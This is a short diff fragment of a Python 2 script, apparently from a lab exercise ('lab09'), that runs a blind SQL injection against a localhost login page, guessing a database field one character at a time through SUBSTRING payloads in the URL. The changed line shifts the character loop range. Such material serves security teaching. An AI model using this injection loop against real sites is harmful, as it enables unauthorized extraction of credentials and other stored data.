@@ -38,7 +38,7 @@ for row in xrange(46,47):
 		word=""
 		for pos in xrange(1,size+1):
 
-			for c in xrange(0,129):
+			for c in xrange(-1,128):
 				request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20"+ str(row) +"%20AND%20SUBSTRING(" + str(field) + ","+ str(pos) +",1)%20=%20%27" + listASCII[c] + "%27%20--%20" 
 				f = urllib.urlopen(request)
 				response = f.read()
